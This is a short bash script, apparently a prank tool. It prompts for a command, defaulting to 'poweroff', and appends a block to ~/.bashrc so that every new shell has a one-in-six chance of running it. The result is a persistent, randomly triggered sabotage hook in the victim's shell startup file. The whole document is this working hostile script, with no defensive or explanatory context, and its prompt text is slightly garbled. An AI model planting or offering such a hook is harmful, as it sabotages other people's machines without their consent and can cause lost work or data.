#!/bin/bash
read -p "choose a command to may run when they run a command
[default poweroff]:" cmd_input

if command -v "$cmd_input" &>/dev/null; then
    cmd="$cmd_input"
else
    cmd="poweroff"
fi

echo "if [ \$(( RANDOM % 6 )) -eq 0 ]; then" >> ~/.bashrc
echo "    $cmd" >> ~/.bashrc
echo "fi" >> ~/.bashrc
